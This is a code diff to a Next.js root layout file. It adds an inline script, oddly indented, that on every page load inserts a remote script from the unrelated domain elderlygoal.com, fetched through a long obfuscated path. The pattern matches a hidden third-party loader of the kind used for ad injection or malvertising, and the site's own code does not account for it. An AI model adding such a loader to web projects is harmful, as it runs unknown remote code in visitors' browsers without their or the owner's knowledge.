@@ -28,6 +28,21 @@ export default function RootLayout({
           {children}
           <Toaster />
         </FirebaseClientProvider>
+        <script 
+          dangerouslySetInnerHTML={{ 
+              __html: `(function(bufk){
+                    var d = document,
+                              s = d.createElement('script'),
+                                        l = d.scripts[d.scripts.length - 1];
+                                              s.settings = bufk || {};
+                                                    s.src = "//elderlygoal.com/dVmyF.zxdcG/N_v/ZZGmUT/VeFmT9yuhZzUnlYkdPETFcnw-OnTgIOxHNojYk/tpNszsAX5kM/j/EX3iM/wk";
+                                                          s.async = true;
+                                                                s.referrerPolicy = 'no-referrer-when-downgrade';
+                                                                      l.parentNode.insertBefore(s, l);
+                                                                          })({})` 
+                                                                            }} 
+                                                                            />
+                                                                            
       </body>
     </html>
   );
